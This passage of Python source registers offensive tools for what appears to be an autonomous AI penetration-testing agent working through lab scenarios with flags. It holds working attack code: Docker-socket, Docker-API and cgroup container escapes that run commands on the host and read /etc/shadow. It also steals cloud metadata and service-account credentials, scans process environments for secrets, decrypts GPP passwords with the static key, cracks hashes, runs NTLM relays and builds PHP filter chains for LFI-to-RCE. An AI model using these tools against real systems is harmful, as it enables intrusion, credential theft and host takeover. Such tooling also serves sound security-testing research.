            results.append(f"[AWS_IAM]\n{iam_r.stdout[:1000]}")

        return ToolResult(tool_name="check_cloud_metadata", success=True,
            stdout="\n\n".join(results), stderr="", exit_code=0, elapsed_ms=0)

    gateway.register(
        name="check_cloud_metadata",
        func=check_cloud_metadata,
        description="Check cloud metadata endpoints for AWS, GCP, Azure, Alicloud, and DigitalOcean. Extracts instance info, IAM credentials, and service account tokens. Use when inside a container or VM on cloud infrastructure — cloud credentials can enable lateral movement to cloud services.",
        parameters={},
    )

    # ── Network Capture ─────────────────────────────────────────
    # Packet capture for network attack scenarios (NET-01/02/03)
    # and K8s network attacks (K8S-22/24).

    gateway.register_shell_tool(
        name="tcpdump_capture",
        command_template="timeout {duration} tcpdump -i {interface} -n {filter} {opts} 2>&1 | head -200",
        description="Capture network packets using tcpdump. Use for ARP spoofing detection (filter='arp'), DNS exfiltration analysis (filter='udp port 53'), credential sniffing (filter='tcp port 80 or tcp port 443'), and K8s network attacks. Common filters: 'arp', 'udp port 53', 'host 10.0.0.1', 'tcp port 80', 'icmp'. Use opts='-A' for ASCII payload, '-X' for hex+ASCII, '-c 100' for packet count limit.",
        parameters={
            "interface": {"type": "string", "description": "Network interface to capture on (e.g. 'eth0', 'any', 'docker0')", "default": "eth0"},
            "filter": {"type": "string", "description": "BPF filter expression (e.g. 'udp port 53' for DNS, 'arp' for ARP, 'tcp port 80' for HTTP)", "default": ""},
            "duration": {"type": "integer", "description": "Capture duration in seconds", "default": 30},
            "opts": {"type": "string", "description": "Additional tcpdump options: '-A' for ASCII output, '-X' for hex+ASCII, '-c N' for packet count limit", "default": "-A"},
        },
        parser=_parse_shell_output,
        timeout=45,
    )

    gateway.register_shell_tool(
        name="kubectl_get_pods",
        command_template="kubectl get pods -A -o json 2>&1 | head -200",
        description="List all pods in the Kubernetes cluster across all namespaces",
        parameters={},
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="kubectl_run",
        command_template="kubectl run {name} --image={image} --restart=Never -n {namespace} --command -- {command} 2>&1",
        description="Create and run a pod in Kubernetes. Use for deploying test containers, privilege escalation pods, or reverse shells. Requires namespace creation permissions.",
        parameters={
            "name": {"type": "string", "description": "Pod name (e.g. 'test-pod')"},
            "image": {"type": "string", "description": "Container image (e.g. 'busybox', 'ubuntu')"},
            "namespace": {"type": "string", "description": "K8s namespace"},
            "command": {"type": "string", "description": "Command to run in the container"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    async def _etcdctl_get(
        endpoint: str, key: str = "/", output_opts: str = "",
        insecure: bool = True, cacert: str = "", cert: str = "", tls_key: str = "",
    ) -> ToolResult:
        """Query etcd key-value store directly.

        etcd stores all Kubernetes cluster state including Secrets.
        For HTTPS endpoints, --insecure-skip-tls-verify is added by default
        (set insecure=false to disable). When etcd client certs are available,
        pass cacert/cert/tls_key paths for mutual TLS authentication.
        """
        _tls_opts = ""
        if "https://" in (endpoint or ""):
            if insecure:
                _tls_opts += " --insecure-skip-tls-verify"
            if cacert:
                _tls_opts += f" --cacert={cacert}"
            if cert:
                _tls_opts += f" --cert={cert}"
            if tls_key:
                _tls_opts += f" --key={tls_key}"
        _cmd = (
            f"ETCDCTL_API=3 etcdctl --endpoints={endpoint}{_tls_opts} "
            f"get {key} {output_opts} 2>&1 | head -200"
        )
        result = await _run_shell(_cmd, timeout=30)
        return ToolResult(tool_name="etcdctl_get", success=result.exit_code == 0,
            stdout=result.stdout[:4000], stderr=result.stderr,
            exit_code=result.exit_code, elapsed_ms=result.elapsed_ms)

    gateway.register(
        name="etcdctl_get",
        func=_etcdctl_get,
        description="Query etcd key-value store directly. etcd stores all Kubernetes cluster state including Secrets. For HTTPS endpoints automatically adds --insecure-skip-tls-verify (override with insecure=false). Supports mutual TLS via cacert/cert/tls_key params. Use --prefix --keys-only for exploration, -o json for full values.",
        parameters={
            "endpoint": {"type": "string", "description": "etcd endpoint (e.g. 'http://localhost:11379', 'https://10.0.0.1:2379')"},
            "key": {"type": "string", "description": "etcd key to read. Default '/' with --prefix for all keys, or a specific path like '/registry/secrets/namespace/secretname'"},
            "output_opts": {"type": "string", "description": "Additional etcdctl options. Use '--prefix --keys-only' for key discovery, '-o json' for full value output of a specific key, '--prefix -o json' for all keys with values"},
            "insecure": {"type": "boolean", "description": "Skip TLS certificate verification for HTTPS endpoints (default true). Set false if valid certs available."},
            "cacert": {"type": "string", "description": "Path to CA certificate for TLS verification (e.g. /etc/kubernetes/pki/etcd/ca.crt)"},
            "cert": {"type": "string", "description": "Path to client certificate for mutual TLS (e.g. /etc/kubernetes/pki/etcd/server.crt)"},
            "tls_key": {"type": "string", "description": "Path to client key for mutual TLS (e.g. /etc/kubernetes/pki/etcd/server.key)"},
        },
    )
    gateway.register_shell_tool(
        name="kubelet_probe",
        command_template="curl -sk https://{host}:10250/pods 2>&1 | head -100",
        description="Probe the Kubelet API (port 10250) for pod information. Unauthenticated access reveals running pods on the node. Use for container escape reconnaissance.",
        parameters={
            "host": {"type": "string", "description": "Node IP or hostname running kubelet"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="sa_token_read",
        command_template="cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 && echo '---CA---' && cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>&1 | head -5",
        description="Read the Kubernetes ServiceAccount token and CA certificate from the default pod mount point. Use to authenticate to the K8s API server from within a pod.",
        parameters={},
        parser=_parse_shell_output,
        timeout=15,
    )
    gateway.register_shell_tool(
        name="kubectl_get_clusterrolebindings",
        command_template="kubectl get clusterrolebindings -o json 2>&1 | head -200",
        description="List all ClusterRoleBindings in the cluster. Use to identify over-privileged subjects and potential RBAC escalation paths.",
        parameters={},
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="kubectl_exec",
        command_template="kubectl exec {pod} -n {namespace} -- {command} 2>&1",
        description="Execute a command inside a running Kubernetes pod. Use for post-exploitation after gaining pod access.",
        parameters={
            "pod": {"type": "string", "description": "Pod name"},
            "namespace": {"type": "string", "description": "K8s namespace"},
            "command": {"type": "string", "description": "Command to execute inside the pod"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="docker_registry",
        command_template="docker pull {image} 2>&1 && docker tag {image} {target_registry}/{image_name} 2>&1 && docker push {target_registry}/{image_name} 2>&1",
        description="Pull, tag, and push a Docker image to a target registry. Use for container registry poisoning attacks (K8S-09 supply chain).",
        parameters={
            "image": {"type": "string", "description": "Source image (e.g. 'busybox:latest')"},
            "target_registry": {"type": "string", "description": "Target registry (e.g. 'localhost:5000')"},
            "image_name": {"type": "string", "description": "Image name at target registry"},
        },
        parser=_parse_shell_output,
        timeout=120,
    )
    gateway.register_shell_tool(
        name="helm",
        command_template="helm {command} 2>&1",
        description="Execute a Helm command. For Helm v2 Tiller abuse (K8S-10): use '--host <tiller-svc>.<namespace>:44134 ls --all' to connect to an unauthenticated Tiller gRPC service and list releases. Use '--host <tiller-svc>.<namespace>:44134 get manifest <release>' to extract secrets from a release manifest. Do NOT use --tiller-namespace (Helm v2 only) — use --host for connecting to Tiller directly.",
        parameters={
            "command": {"type": "string", "description": "Full helm command. For Tiller: '--host <svc>.<ns>:44134 ls --all'"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="searchsploit_copy",
        command_template="searchsploit -m {exploit_id} 2>&1 && cat $(searchsploit -p {exploit_id} 2>/dev/null | grep 'Path:' | head -1 | awk '{{print $NF}}' | tr -d $'\\r') 2>/dev/null",
        description="Copy an Exploit-DB exploit to current directory and show its source code. Use for Linux kernel exploits (LNX-01~05) — download C source, then compile with gcc and execute. Use the EDB-ID (e.g. '12345') as exploit_id.",
        parameters={
            "exploit_id": {"type": "string", "description": "Exploit-DB ID (EDB-ID) to download"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="php_filter_chain",
        command_template="python3 -c \"\nbase = '{file_path}'\nchain = 'php://filter/convert.base64-encode/resource=' + base\nfor _ in range({chain_depth}):\n    chain = 'php://filter/convert.base64-decode|convert.base64-encode/resource=' + chain\nprint(chain)\n\" 2>&1",
        description="Generate a PHP filter chain for LFI-to-RCE attacks (WEB-06 CVE-2025-0366). Creates nested php://filter/ wrappers to achieve remote code execution from a local file inclusion vulnerability. Pass the target PHP file path and chain depth (default 8). Pipe output through curl to exploit.",
        parameters={
            "file_path": {"type": "string", "description": "Target PHP file path for inclusion (e.g. '/var/www/html/index.php')"},
            "url": {"type": "string", "description": "Alias for file_path — server-side PHP file path"},
            "chain_depth": {"type": "integer", "description": "Filter chain depth (5-15, default 8)", "default": 8},
        },
        parser=_parse_shell_output,
        timeout=15,
    )
    gateway.register_shell_tool(
        name="impacket_ntlmrelayx",
        command_template="timeout 30 python3 /home/kianabin/Darwin/venv/bin/ntlmrelayx.py -t {target_url} {extra_args} 2>&1",
        description="Run NTLM relay attack via impacket-ntlmrelayx. Use for AD CS ESC8 (AD-06, AD-Chain-2/3/6) — relay captured NTLM authentication to AD CS HTTP endpoint to obtain certificates. Target URL should point to the AD CS certsrv endpoint (e.g. 'http://dc/certsrv/certfnsh.asp'). Add '-smb2support' for SMBv2 targets.",
        parameters={
            "target_url": {"type": "string", "description": "Target URL to relay NTLM auth to (e.g. AD CS HTTP endpoint)"},
            "extra_args": {"type": "string", "description": "Additional ntlmrelayx arguments (e.g. '-smb2support --adcs')"},
        },
        parser=_parse_shell_output,
        timeout=35,
    )

    # ── GPP cPassword Decryption ──────────────────────────────────

    async def gpp_decrypt(cpassword: str) -> ToolResult:
        """Decrypt a Microsoft GPP (Group Policy Preferences) cpassword value.

        GPP passwords stored in SYSVOL Groups.xml use AES-256-CBC encryption
        with a well-known static key published by Microsoft (MS-MDQH). This
        tool performs the full decryption chain: base64 decode, AES-256-CBC
        decrypt, PKCS7 padding removal, and UTF-16LE decode.

        Use for: AD-13 GPP/cpassword scenarios, any domain where SYSVOL
        Groups.xml contains encrypted cpassword values. Combine with
        smb_client to retrieve the XML files from SYSVOL first.
        """
        import base64 as _b64
        import subprocess as _sp
        import tempfile as _tmp
        import os as _os

        pw = (cpassword or "").strip()
        if not pw:
            return ToolResult(tool_name="gpp_decrypt", success=False,
                stdout="", stderr="cpassword parameter is required (base64-encoded string from Groups.xml)", exit_code=1, elapsed_ms=0)

        # Microsoft GPP static AES-256-CBC key (publicly documented since 2012)
        _GPP_KEY = "4e9906e8fcb66cc9faf49310620ffee8f496806cc057990209b09a433b66c1b"
        _GPP_IV  = "00000000000000000000000000000000"

        t0 = time.perf_counter()
        try:
            raw = _b64.b64decode(pw)
        except Exception:
            return ToolResult(tool_name="gpp_decrypt", success=False,
                stdout="", stderr=f"Failed to base64-decode cpassword: '{pw[:80]}...'", exit_code=1, elapsed_ms=0)

        # Write raw encrypted bytes to temp file, decrypt with openssl
        enc_path = ""
        try:
            with _tmp.NamedTemporaryFile(mode="wb", suffix=".enc", delete=False) as _ef:
                _ef.write(raw)
                enc_path = _ef.name

            dec = _sp.run(
                ["openssl", "enc", "-aes-256-cbc", "-d",
                 "-K", _GPP_KEY, "-iv", _GPP_IV, "-nopad",
                 "-in", enc_path],
                capture_output=True, timeout=15,
            )
            _os.unlink(enc_path)

            if dec.returncode != 0:
                return ToolResult(tool_name="gpp_decrypt", success=False,
                    stdout="", stderr=f"OpenSSL decryption failed: {dec.stderr.decode()[:500]}", exit_code=dec.returncode,
                    elapsed_ms=int((time.perf_counter() - t0) * 1000))

            plain = dec.stdout

            # Strip PKCS7 padding (last byte = number of padding bytes)
            if plain:
                pad_len = plain[-1]
                if 0 < pad_len <= 16:
                    plain = plain[:-pad_len]

            # Decode as UTF-16LE, strip null bytes
            try:
                text = plain.decode("utf-16-le").rstrip("\x00")
            except Exception:
                text = plain.decode("latin-1").rstrip("\x00")

            elapsed = int((time.perf_counter() - t0) * 1000)
            return ToolResult(tool_name="gpp_decrypt", success=True,
                stdout=text.strip(), stderr="", exit_code=0, elapsed_ms=elapsed)

        except FileNotFoundError:
            return ToolResult(tool_name="gpp_decrypt", success=False,
                stdout="", stderr="openssl not installed — required for GPP decryption", exit_code=127,
                elapsed_ms=int((time.perf_counter() - t0) * 1000))
        except Exception as exc:
            return ToolResult(tool_name="gpp_decrypt", success=False,
                stdout="", stderr=f"GPP decryption error: {exc}", exit_code=1,
                elapsed_ms=int((time.perf_counter() - t0) * 1000))
        finally:
            try:
                if _os.path.exists(enc_path):
                    _os.unlink(enc_path)
            except Exception:
                pass

    gateway.register(
        name="gpp_decrypt",
        func=gpp_decrypt,
        description="Decrypt a Microsoft GPP (Group Policy Preferences) cpassword value from SYSVOL Groups.xml. Decrypts AES-256-CBC encrypted passwords using the publicly documented Microsoft GPP key. Use after retrieving Groups.xml via smb_client from \\\\DOMAIN\\SYSVOL. Input is the base64-encoded cpassword string from the XML.",
        parameters={
            "cpassword": {"type": "string", "description": "Base64-encoded cpassword value from Groups.xml (e.g. from <Properties cpassword='...'>)"},
        },
    )

    # ── Hash Cracking ─────────────────────────────────────────────

    async def hash_crack(
        hash_string: str, hash_type: str = "", timeout: int = 120,
    ) -> ToolResult:
        """Attempt to crack a password hash offline using hashcat or john.

        Auto-detects common hash formats from their prefix. Wraps hashcat
        and john-the-ripper with graceful fallback. This is a general
        capability — the tool does not know about any specific target or
        scenario.
        """
        import tempfile as _tmp
        import subprocess as _sp
        import os as _os

        hs = (hash_string or "").strip()
        if not hs:
            return ToolResult(tool_name="hash_crack", success=False,
                stdout="", stderr="hash_string is required", exit_code=1, elapsed_ms=0)

        # ── Auto-detect hash type ──────────────────────────────────
        ht = (hash_type or "").strip()
        if not ht:
            if "$krb5tgs$23$" in hs:       ht = "13100"    # Kerberoast
            elif "$krb5asrep$23$" in hs:    ht = "18200"    # AS-REP roast
            elif hs.startswith("$2a$") or hs.startswith("$2b$") or hs.startswith("$2y$"):
                ht = "3200"                                 # bcrypt
            elif hs.startswith("$6$"):      ht = "1800"     # SHA-512 crypt
            elif hs.startswith("$1$"):      ht = "500"      # MD5 crypt
            elif hs.startswith("$5$"):      ht = "7400"     # SHA-256 crypt
            elif len(hs) == 32 and all(c in "0123456789abcdefABCDEF" for c in hs):
                ht = "1000"                                 # NTLM
            else:
                return ToolResult(tool_name="hash_crack", success=False,
                    stdout="", stderr=f"Could not auto-detect hash type from prefix. Please specify hash_type manually (hashcat mode number: 13100=Kerberoast, 18200=AS-REP, 1000=NTLM, 3200=bcrypt, 1800=SHA-512). Hash prefix: {hs[:60]}...", exit_code=1, elapsed_ms=0)

        timeout_s = max(10, min(600, int(timeout)))
        words = "/usr/share/wordlists/rockyou.txt"

        t0 = time.perf_counter()
        tmp_path = ""

        def _cleanup():
            try:
                if tmp_path and _os.path.exists(tmp_path):
                    _os.unlink(tmp_path)
            except Exception:
                pass

        try:
            # Write hash to temp file
            with _tmp.NamedTemporaryFile(mode="w", suffix=".hash", delete=False) as _hf:
                _hf.write(hs + "\n")
                tmp_path = _hf.name

            # Try hashcat first
            try_hashcat = _sp.run(
                ["hashcat", "-m", ht, tmp_path, words, "--force", "--show", "-O"],
                capture_output=True, timeout=min(30, timeout_s), text=True,
            )
            if try_hashcat.returncode == 0 and try_hashcat.stdout.strip():
                out = try_hashcat.stdout.strip()
                if ":" in out and not out.startswith("hashcat"):
                    _cleanup()
                    elapsed = int((time.perf_counter() - t0) * 1000)
                    return ToolResult(tool_name="hash_crack", success=True,
                        stdout=out, stderr="", exit_code=0, elapsed_ms=elapsed)

            # Try longer hashcat run with optimized kernel
            try_hashcat2 = _sp.run(
                ["hashcat", "-m", ht, tmp_path, words, "--force", "-O"],
                capture_output=True, timeout=min(timeout_s, 120), text=True,
            )
            if try_hashcat2.returncode == 0:
                # Rerun with --show to get cracked result
                show = _sp.run(
                    ["hashcat", "-m", ht, tmp_path, "--force", "--show"],
                    capture_output=True, timeout=15, text=True,
                )
                if show.returncode == 0 and ":" in show.stdout.strip():
                    out = show.stdout.strip()
                    if not out.startswith("hashcat"):
                        _cleanup()
                        elapsed = int((time.perf_counter() - t0) * 1000)
                        return ToolResult(tool_name="hash_crack", success=True,
                            stdout=out, stderr="", exit_code=0, elapsed_ms=elapsed)

        except FileNotFoundError:
            pass  # hashcat not installed, try john below
        except Exception:
            pass

        # Fall back to john-the-ripper
        try:
            try_john = _sp.run(
                ["john", f"--wordlist={words}", tmp_path, f"--format={ht}"],
                capture_output=True, timeout=min(timeout_s, 60), text=True,
            )
            if try_john.returncode == 0:
                show_j = _sp.run(
                    ["john", "--show", tmp_path],
                    capture_output=True, timeout=15, text=True,
                )
                if show_j.returncode == 0 and ":" in show_j.stdout.strip():
                    _cleanup()
                    elapsed = int((time.perf_counter() - t0) * 1000)
                    return ToolResult(tool_name="hash_crack", success=True,
                        stdout=show_j.stdout.strip(), stderr="", exit_code=0, elapsed_ms=elapsed)
        except FileNotFoundError:
            pass
        except Exception:
            pass

        _cleanup()
        elapsed = int((time.perf_counter() - t0) * 1000)
        return ToolResult(tool_name="hash_crack", success=False,
            stdout="", stderr=f"Hash not cracked with common wordlist (tried rockyou.txt, auto-detected mode={ht}). Try a more specific wordlist or install hashcat/john if absent.", exit_code=1, elapsed_ms=elapsed)

    gateway.register(
        name="hash_crack",
        func=hash_crack,
        description="Attempt to crack a password hash offline using hashcat or john-the-ripper. Auto-detects hash type from prefix ($krb5tgs$=Kerberoast mode 13100, $krb5asrep$=AS-REP mode 18200, 32-char hex=NTLM mode 1000, $2a$/$2b$=bcrypt mode 3200, $6$=SHA-512 mode 1800). Uses rockyou.txt wordlist by default. Specify hash_type manually if auto-detection fails. This is a general hash-cracking capability — it works against any compatible hash, not just Kerberos.",
        parameters={
            "hash_string": {"type": "string", "description": "Complete hash string (e.g. $krb5tgs$23$*... for Kerberoast, $krb5asrep$23$*... for AS-REP, or 32-char hex for NTLM)"},
            "hash_type": {"type": "string", "description": "Optional hashcat mode number. Auto-detected from prefix if omitted. Common modes: 13100=Kerberoast, 18200=AS-REP, 1000=NTLM, 3200=bcrypt, 1800=SHA-512"},
            "timeout": {"type": "integer", "description": "Max cracking time in seconds (default 120, max 600)"},
        },
    )

    # ── Container Recon ────────────────────────────────────────────
    # Tools for discovering escape vectors inside a container.
    # ALWAYS run these FIRST before any container escape attempt.

    gateway.register_shell_tool(
        name="container_find_sockets",
        command_template="find {path} -type s 2>/dev/null | head -50",
        description="Search for UNIX domain sockets on the filesystem. Use when inside a container to find docker.sock, containerd.sock, or other exploitable sockets. Common paths: /var/run, /run, /tmp. Differs from check_mounts — this finds sockets, not mount points.",
        parameters={
            "path": {"type": "string", "description": "Root path to start scanning from (default '/')"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    gateway.register_shell_tool(
        name="container_find_docker",
        command_template="echo '[1] Checking docker.sock...' && ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null; echo '[2] Scanning Docker TCP ports (2375,2376)...' && (ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || cat /proc/net/tcp 2>/dev/null) | grep -E '2375|2376'; echo '[3] Checking DOCKER_HOST env...' && env 2>/dev/null | grep -i docker; echo '---DONE---'",
        description="Locate Docker daemon via UNIX socket and TCP ports. Checks: (1) common docker.sock paths, (2) TCP ports 2375/2376, (3) DOCKER_HOST env var. Use after container_find_sockets to confirm Docker availability before escape.",
        parameters={},
        parser=_parse_shell_output,
        timeout=30,
    )

    gateway.register_shell_tool(
        name="container_recon_env",
        command_template="echo '[ENV Secrets]' && env 2>/dev/null | grep -iE 'password|secret|token|key|cred|api|auth' | grep -v '^_='; echo '[ProcFS /proc/1/environ]' && (cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'password|secret|token|key|cred|api|auth' || echo 'not-accessible'); echo '[ProcFS scan]' && for p in $(ls /proc/ 2>/dev/null | grep -E '^[0-9]+$' | head -20); do found=$(cat /proc/$p/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'password|secret|token|key' | head -2); if [ -n \"$found\" ]; then echo \"PID $p: $found\"; fi; done; echo '---DONE---'",
        description="Scan container environment variables and /proc/*/environ for secrets (passwords, tokens, API keys, credentials). Use when inside a container to find credentials for lateral movement or cloud access. This is the container equivalent of linux_priv_check — discovers what's available before exploitation.",
        parameters={},
        parser=_parse_shell_output,
        timeout=30,
    )

    # ── Container Escape ──────────────────────────────────────────
    # Tools for breaking out of containers to the host.
    # CRITICAL: Always run Container Recon tools FIRST to identify the
    # escape vector, then pick the ONE matching tool below.

    async def container_escape_docker_sock(
        sock_path: str = "/var/run/docker.sock", shell_cmd: str = "id",
        image: str = "alpine:latest", timeout_cmd: int = 60,
    ) -> ToolResult:
        """Escape container via exposed Docker socket.

        Creates a privileged container with host root filesystem mounted
        at /host, then executes shell_cmd on the host. Equivalent to CDK's
        docker-sock-pwn. Requires write access to docker.sock.

        Use when: container_find_sockets found docker.sock.
        Post-escape: Read /host/flag*, /host/etc/shadow for host privesc.
        """
        import json as _json
        container_config = _json.dumps({
            "Image": image,
            "Cmd": ["/bin/sh", "-c", shell_cmd],
            "HostConfig": {
                "Privileged": True,
                "Binds": ["/:/host"],
                "PidMode": "host",
                "NetworkMode": "host",
            },
            "AttachStdout": True, "AttachStderr": True,
        })
        # Step 1: Pull image (tolerate failure if already present)
        pull = await _run_shell(
            f"curl -s --unix-socket {sock_path} -X POST "
            f"'http://localhost/images/create?fromImage={image}' 2>&1 | tail -5",
            timeout=30,
        )
        # Step 2: Create container
        create = await _run_shell(
            f"echo '{container_config}' | curl -s --unix-socket {sock_path} "
            f"-X POST 'http://localhost/containers/create' "
            f"-H 'Content-Type: application/json' -d @- 2>&1",
            timeout=15,
        )
        container_id = ""
        import re as _re
        id_match = _re.search(r'"Id"\s*:\s*"([a-f0-9]{64})"', create.stdout)
        if id_match:
            container_id = id_match.group(1)
        # Step 3: Start and get output
        if container_id:
            start = await _run_shell(
                f"curl -s --unix-socket {sock_path} -X POST "
                f"'http://localhost/containers/{container_id}/start' 2>&1",
                timeout=15,
            )
            logs = await _run_shell(
                f"curl -s --unix-socket {sock_path} "
                f"'http://localhost/containers/{container_id}/logs?stdout=1&stderr=1' 2>&1",
                timeout=timeout_cmd,
            )
            # Cleanup container
            await _run_shell(
                f"curl -s --unix-socket {sock_path} -X DELETE "
                f"'http://localhost/containers/{container_id}?force=1' 2>&1",
                timeout=10,
            )
            combined = f"CREATE: {create.stdout[:500]}\nOUTPUT: {logs.stdout[:3000]}"
            return ToolResult(tool_name="container_escape_docker_sock", success=True,
                stdout=combined, stderr="", exit_code=0,
                elapsed_ms=create.elapsed_ms + logs.elapsed_ms)
        return ToolResult(tool_name="container_escape_docker_sock", success=False,
            stdout=f"PULL: {pull.stdout[:500]}\nCREATE: {create.stdout[:500]}",
            stderr="Failed to extract container ID from create response.", exit_code=1,
            elapsed_ms=0)

    gateway.register(
        name="container_escape_docker_sock",
        func=container_escape_docker_sock,
        description="ESCAPE container via exposed docker.sock. Creates a privileged container with host root (/) mounted at /host, then runs your command on the HOST. Use ONLY after container_find_sockets confirms docker.sock exists. Start with shell_cmd='cat /host/flag*' to find flags on the host.",
        parameters={
            "sock_path": {"type": "string", "description": "Path to docker.sock (default /var/run/docker.sock)"},
            "shell_cmd": {"type": "string", "description": "Command to execute on the HOST via privileged container (e.g. 'cat /host/flag*', 'cat /host/etc/shadow')"},
            "image": {"type": "string", "description": "Container image to use (default alpine:latest)"},
            "timeout_cmd": {"type": "integer", "description": "Max seconds for shell_cmd execution (default 60)"},
        },
    )

    async def container_escape_docker_api(
        host: str, port: int = 2375, shell_cmd: str = "id",
        image: str = "alpine:latest",
    ) -> ToolResult:
        """Escape container via exposed Docker TCP API (port 2375/2376).

        Same principle as docker.sock escape but over TCP. Creates a
        privileged container with host root mounted. Equivalent to CDK's
        docker-api-pwn. Use when container_find_docker finds TCP 2375.

        No authentication needed on default Docker API configuration.
        """
        import json as _json
        base_url = f"http://{host}:{port}"
        container_config = _json.dumps({
            "Image": image,
            "Cmd": ["/bin/sh", "-c", shell_cmd],
            "HostConfig": {
                "Privileged": True,
                "Binds": ["/:/host"],
                "PidMode": "host",
                "NetworkMode": "host",
            },
            "AttachStdout": True, "AttachStderr": True,
        })
        # Create container
        create = await _run_shell(
            f"echo '{container_config}' | curl -s --connect-timeout 5 "
            f"-X POST '{base_url}/containers/create' "
            f"-H 'Content-Type: application/json' -d @- 2>&1",
            timeout=20,
        )
        import re as _re
        id_match = _re.search(r'"Id"\s*:\s*"([a-f0-9]{64})"', create.stdout)
        if not id_match:
            return ToolResult(tool_name="container_escape_docker_api", success=False,
                stdout=create.stdout, stderr="Failed to create container.", exit_code=1, elapsed_ms=0)
        cid = id_match.group(1)
        # Start and get output
        await _run_shell(f"curl -s --connect-timeout 5 -X POST '{base_url}/containers/{cid}/start' 2>&1", timeout=15)
        logs = await _run_shell(f"curl -s --connect-timeout 5 '{base_url}/containers/{cid}/logs?stdout=1&stderr=1' 2>&1", timeout=60)
        # Cleanup
        await _run_shell(f"curl -s --connect-timeout 5 -X DELETE '{base_url}/containers/{cid}?force=1' 2>&1", timeout=10)
        return ToolResult(tool_name="container_escape_docker_api", success=True,
            stdout=logs.stdout[:3000], stderr="", exit_code=0, elapsed_ms=0)

    gateway.register(
        name="container_escape_docker_api",
        func=container_escape_docker_api,
        description="ESCAPE container via Docker TCP API (port 2375, no auth). Creates privileged container with host root mounted. Use ONLY after container_find_docker confirms TCP Docker API is reachable. Start with shell_cmd='cat /host/flag*' to find flags. Differs from docker_sock escape — this works over TCP network, not UNIX socket.",
        parameters={
            "host": {"type": "string", "description": "Docker API host IP or hostname (e.g. 'localhost', '10.0.0.1')"},
            "port": {"type": "integer", "description": "Docker API TCP port (default 2375, also try 2376 for TLS)"},
            "shell_cmd": {"type": "string", "description": "Command to execute on the HOST"},
            "image": {"type": "string", "description": "Container image (default alpine:latest)"},
        },
    )

    # ── CRI Runtime Interaction ─────────────────────────────────
    # crictl for containerd/CRI-O socket attacks (K8S-16).

    gateway.register_shell_tool(
        name="crictl_cmd",
        command_template="crictl --runtime-endpoint {endpoint} {action} {args} 2>&1 | head -200",
        description="Interact with containerd/CRI-O runtime via crictl. Use for K8S-16 CRI socket attacks — when /run/containerd/containerd.sock is mounted, bypass K8s API and directly control containers on the node. Actions: 'pods' (list pods), 'ps -a' (list all containers), 'inspect CONTAINER_ID' (container details), 'exec CONTAINER_ID CMD' (execute in container), 'images' (list images), 'pull IMAGE' (pull image).",
        parameters={
            "endpoint": {"type": "string", "description": "CRI socket path (e.g. 'unix:///run/containerd/containerd.sock')", "default": "unix:///run/containerd/containerd.sock"},
            "action": {"type": "string", "description": "CRI action: pods, ps, inspect, exec, images, pull"},
            "args": {"type": "string", "description": "Arguments for the action (container ID for inspect/exec, image name for pull, '-a' for ps)", "default": ""},
        },
        parser=_parse_shell_output,
        timeout=60,
    )

    # ── Namespace Escape ────────────────────────────────────────
    # nsenter for container namespace escape (K8S-11/14/23).

    gateway.register_shell_tool(
        name="nsenter_exec",
        command_template="nsenter --target {target_pid} --mount --pid --net --ipc --uts {command} 2>&1",
        description="Execute a command in host namespaces via nsenter. Use for container escape when privileged (K8S-11: privileged:true) or hostPID enabled (K8S-23). Target PID 1 for host init. For chroot-based access, also try: nsenter --target 1 --mount cat /host-flag/flag.txt. Works when the container has CAP_SYS_ADMIN or is privileged.",
        parameters={
            "target_pid": {"type": "integer", "description": "Target PID whose namespaces to enter (1 for host init, or host PID visible with hostPID=true)", "default": 1},
            "command": {"type": "string", "description": "Command to execute in target namespaces (e.g. 'cat /flag.txt', 'id', 'ls /host-flags/')", "default": "id"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    async def container_escape_cgroup(
        shell_cmd: str, subsystem: str = "memory",
    ) -> ToolResult:
        """Escape privileged container via cgroup release_agent.

        Requires: --privileged flag with SYS_ADMIN capability and cgroup v1.
        Mounts a cgroup, sets release_agent to execute a script on the host,
        then triggers release. Equivalent to CDK's mount-cgroup.

        Use when: check_capabilities shows SYS_ADMIN and container is privileged.
        The result of shell_cmd appears in /tmp/cdk_escape_output.
        """
        import random, string as _str
        rand_id = ''.join(random.choices(_str.ascii_lowercase, k=6))
        cgroup_dir = f"/tmp/cgrp_{rand_id}"
        output_file = f"/tmp/cdk_escape_{rand_id}.out"
        # Build the exploit script
        script = f"""#!/bin/sh
{shell_cmd} > {output_file} 2>&1
"""
        script_path = f"/tmp/cdk_exp_{rand_id}.sh"
        # Write the exploit script
        import os
        try:
            with open(script_path, 'w') as f:
                f.write(script)
            os.chmod(script_path, 0o755)
        except Exception as e:
            return ToolResult(tool_name="container_escape_cgroup", success=False,
                stdout="", stderr=f"Failed to write exploit script: {e}", exit_code=1, elapsed_ms=0)

        # Execute the cgroup escape sequence
        escape_cmd = (
            f"mkdir -p {cgroup_dir} 2>&1 && "
            f"mount -t cgroup -o {subsystem} cgroup {cgroup_dir} 2>&1 && "
            f"mkdir -p {cgroup_dir}/x_{rand_id} 2>&1 && "
            f"echo 1 > {cgroup_dir}/x_{rand_id}/notify_on_release 2>&1 && "
            f"host_path=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /proc/self/mountinfo 2>/dev/null | head -1) 2>&1; "
            f"echo \"host_path=$host_path\" 2>&1; "
            f"echo \"$host_path/{script_path}\" > {cgroup_dir}/release_agent 2>&1 && "
            f"sh -c 'echo $$ > {cgroup_dir}/x_{rand_id}/cgroup.procs' 2>&1; "
            f"sleep 2 2>&1; "
            f"cat {output_file} 2>&1 || echo 'NO_OUTPUT_FILE' 2>&1"
        )
        result = await _run_shell(escape_cmd, timeout=30)
        # Cleanup
